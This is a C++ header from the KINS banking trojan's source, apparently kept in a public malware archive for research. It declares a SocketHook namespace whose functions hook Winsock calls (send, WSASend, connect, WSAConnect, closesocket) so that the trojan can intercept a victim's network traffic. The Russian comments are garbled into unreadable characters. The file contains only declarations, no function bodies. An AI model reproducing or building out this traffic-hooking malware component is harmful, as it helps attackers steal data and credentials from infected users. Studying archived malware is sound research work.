/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  �������� WinSocket.
*/
#pragma once

namespace SocketHook
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ����������� closesocket.
  */
  int WSAAPI hookerCloseSocket(SOCKET s);
  
  /*
    ����������� send.
  */
  int WSAAPI hookerSend(SOCKET s, const char *buf, int len, int flags);

  /*
    ����������� WSASend.
  */
  int WSAAPI hookerWsaSend(SOCKET s, LPWSABUF buffers, DWORD bufferCount, LPDWORD numberOfBytesSent, DWORD flags, LPWSAOVERLAPPED overlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE completionRoutine);

  /*
    ����������� connect.
  */
  int WSAAPI hookerConnect(SOCKET s, const struct sockaddr FAR * name, int namelen);

  /*
    ����������� WSAConnect.
  */
  int WINAPI hookerWSAConnect(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
};